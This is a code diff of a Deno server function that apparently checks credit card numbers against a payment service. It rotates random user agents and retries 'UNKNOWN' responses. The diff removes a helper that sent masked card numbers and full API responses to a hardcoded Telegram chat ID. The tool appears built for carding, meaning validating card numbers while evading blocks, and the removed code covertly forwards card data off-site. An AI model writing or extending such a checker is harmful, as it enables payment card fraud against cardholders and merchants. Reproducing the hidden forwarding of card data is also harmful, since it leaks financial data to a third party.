@@ -1,10 +1,5 @@
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
 
-const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
-const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID");
-// Use environment variable with fallback for admin chat ID
-const ADMIN_CHAT_ID = ADMIN_TELEGRAM_CHAT_ID || "8496943061";
-
 const corsHeaders = {
   'Access-Control-Allow-Origin': '*',
   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
@@ -27,32 +22,6 @@ const userAgents = [
 // Get random user agent
 const getRandomUserAgent = (): string => {
   return userAgents[Math.floor(Math.random() * userAgents.length)];
-};
-
-// Send debug message to admin via Telegram
-const sendDebugToAdmin = async (card: string, response: unknown, isUnknown: boolean): Promise<void> => {
-  if (!TELEGRAM_BOT_TOKEN || !isUnknown) return;
-  
-  try {
-    const maskedCard = card.substring(0, 6) + '******' + card.substring(card.length - 4);
-    const responseStr = typeof response === 'string' ? response : JSON.stringify(response, null, 2);
-    
-    const message = `⚠️ <b>UNKNOWN Card Response Debug</b>\n\n` +
-      `<b>Card:</b> <code>${maskedCard}</code>\n\n` +
-      `<b>Full API Response:</b>\n<pre>${responseStr.substring(0, 3500)}</pre>`;
-    
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: ADMIN_CHAT_ID,
-        text: message,
-        parse_mode: 'HTML',
-      }),
-    });
-  } catch (err) {
-    console.error('Failed to send debug to admin:', err);
-  }
 };
 
 // Check if response should be classified as unknown
@@ -115,12 +84,6 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     return performCheck(cc, newUserAgent, attempt + 1);
   }
 
-  // If still UNKNOWN after all retries, send debug to admin
-  if (isUnknown) {
-    console.log('UNKNOWN response after all retries, sending debug to admin');
-    await sendDebugToAdmin(cc, data, true);
-  }
-
   return data;
 };
 
@@ -155,9 +118,6 @@ serve(async (req) => {
   } catch (error: unknown) {
     const errorMessage = error instanceof Error ? error.message : 'Unknown error';
     console.error('Error:', errorMessage);
-    
-    // Send error debug to admin
-    await sendDebugToAdmin('unknown', { error: errorMessage }, true);
     
     return new Response(
       JSON.stringify({ error: errorMessage, status: "ERROR" }),
